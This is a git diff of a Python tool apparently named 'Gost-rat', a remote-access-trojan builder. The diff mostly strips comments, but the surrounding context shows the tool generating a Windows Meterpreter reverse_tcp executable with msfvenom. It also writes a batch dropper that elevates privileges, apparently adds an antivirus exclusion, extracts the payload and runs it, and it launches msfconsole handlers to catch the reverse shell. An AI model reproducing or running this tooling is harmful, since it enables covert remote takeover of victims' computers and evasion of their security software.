@@ -10,7 +10,7 @@ import os
 import sys
 import time
 
-# ---------- Color Setup ----------
+
 try:
     from colorama import init, Fore, Style
     init(autoreset=True)
@@ -29,7 +29,7 @@ except ImportError:
     MAGENTA= "\033[1;35m"
     RESET  = "\033[0m"
 
-# ---------- NEW Big ASCII Banner (Gost-rat) ----------
+
 BANNER = r"""
  ██████╗  ██████╗ ███████╗████████╗    ██████╗  █████╗ ████████╗
 ██╔════╝ ██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔══██╗╚══██╔══╝
@@ -39,7 +39,7 @@ BANNER = r"""
  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
 """
 
-GITHUB  = "https://github.com/surafel-creater"   # <-- change later
+GITHUB  = "https://github.com/surafel-creater/GOST_RATc2"   
 VERSION = "1.0"
 CREATOR = "Surafel Worku"
 
@@ -169,7 +169,7 @@ def create_windows_rat():
         f"LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
     )
 
-    # Silently build — no terminal output shown
+   
     try:
         result = subprocess.run(
             cmd, shell=True,
@@ -218,7 +218,7 @@ def create_bat_and_zip():
         print(f"  {YELLOW}[{i}]{WHITE} {os.path.basename(exe)} {CYAN}({size} bytes){RESET}")
 
 
-    # ---------- STEP 2: user picks one ----------
+   
     try:
         pick = input(f"\n{YELLOW}Select exe number:{RESET} ").strip()
         chosen = exes[int(pick) - 1]
@@ -227,7 +227,7 @@ def create_bat_and_zip():
         time.sleep(1)
         return
 
-    base = os.path.splitext(os.path.basename(chosen))[0]  # e.g. "devil"
+    base = os.path.splitext(os.path.basename(chosen))[0]  
     target_name = f"{base}.exe"
     zip_name = f"{base}.zip"
     bat_name = f"{base}.bat"
@@ -236,7 +236,7 @@ def create_bat_and_zip():
     print(f"{CYAN}    Zip file : {WHITE}{zip_name}{RESET}")
     print(f"{CYAN}    Bat file : {WHITE}{bat_name}{RESET}\n")
 
-    # ---------- STEP 3: build the .bat (exe name replaces 'target' everywhere) ----------
+    
     bat_content = f"""@echo off
 :: ============================================================
 ::  {bat_name} - elevate, deploy {zip_name}, exclude, extract, execute
@@ -317,8 +317,7 @@ exit
 """
 
     try:
-        # Write .bat with CRLF line endings (required for Windows batch files,
-        # important since we are generating it from Linux)
+        
         with open(bat_name, "w", newline="\r\n", encoding="ascii", errors="ignore") as f:
             f.write(bat_content)
         os.chmod(bat_name, 0o644)
@@ -396,7 +395,7 @@ def free_port(port):
     if pids:
         print(f"[*] Port {port} in use by PID(s) {', '.join(pids)} — killing...", flush=True)
         subprocess.run(["sudo", "kill", *pids])
-        time.sleep(2)   # give the OS a moment to release the socket
+        time.sleep(2)  
 
 
 
@@ -493,7 +492,7 @@ def auto_listener(interfaces=("eth0", "wlan0"), port=4444):
 
     display_ip = selected_ip if selected_ip else "0.0.0.0"
 
-    # --- 3. Run msfconsole handler in the foreground (exactly as your command) ---
+   
     cmd = (
         f'msfconsole -q -x "use exploit/multi/handler; '
         f'set payload windows/x64/meterpreter/reverse_tcp; '
@@ -527,13 +526,12 @@ def manual_listener():
 
     display_ip = LHOST
 
-    # --- 1. Free the port ---
     port_freed = clear_port(LPORT)
     if not port_freed:
         print(f"[!] Failed to free port {LPORT}.")
         return network_submenu()
 
-    # --- 2. Run msfconsole handler in the foreground (exactly as your command) ---
+    
     cmd = (
         f'msfconsole -q -x "use exploit/multi/handler; '
         f'set payload windows/x64/meterpreter/reverse_tcp; '
